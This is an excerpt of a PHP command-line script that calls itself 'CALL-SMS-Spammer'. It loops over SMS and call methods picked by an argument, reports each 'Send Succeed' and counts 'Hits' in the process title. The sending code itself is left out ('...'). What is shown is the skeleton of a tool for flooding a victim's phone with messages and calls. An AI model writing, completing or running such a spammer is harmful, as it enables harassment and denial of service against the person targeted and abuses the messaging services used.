...
if (function_exists("cli_set_process_title")) cli_set_process_title("CALL-SMS-Spammer - 0 Hits");
		...
		while (!$success) {
			foreach (["SMS", "CALL"] as $method) {
				if (strtoupper($argv[2]) === "ALL" || strtoupper($argv[2]) === $method) {
					...
					if ($result) {
						echo date("[H:i:s]")." ".$method." Send Succeed.\n";
						if (function_exists("cli_set_process_title")) cli_set_process_title("CALL-SMS-Spammer - ".++$i." Hits");
						$success = true;
					}
				}
			}
